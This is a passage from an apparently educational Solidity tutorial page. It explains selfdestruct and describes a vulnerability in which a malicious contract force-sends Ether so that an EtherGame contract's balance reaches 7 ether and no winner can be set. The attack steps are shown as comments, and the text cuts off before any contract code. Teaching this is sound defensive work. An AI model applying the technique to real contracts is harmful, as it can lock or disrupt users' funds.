  description="An example of how to delete your smart contract by calling seldestruct in Solidity"
  html="<p>Contracts can be deleted from the blockchain by calling <code>selfdestruct</code>.</p>
<p><code>selfdestruct</code> sends all remainig Ether stored in the contract to an
designated address.</p>
<h3 id=\\"vulnerability\\">Vulnerability</h3>
<p>A malicious contract can use <code>selfdestruct</code> to
force send Ether to any contract.</p>
<pre><code class=\\"language-solidity\\">pragma solidity ^0.5.16;

// The goal of this game is to be the 7th player to deposit 1 Ether.
// Players can deposit only 1 Ether at a time.
// Winner will be able to withdraw all Ether.

/*
1. Deploy EtherGame
2. Players (say Alice and Bob) decides to play, deposits 1 Ether each.
2. Deploy Attack with address of EtherGame
3. Call Attack.attack sending 5 ether. This will break the game
   No one can become the winner.

What happened?
Attack forced the balance of EtherGame to equal 7 ether.
Now no one can deposit and the winner cannot be set.
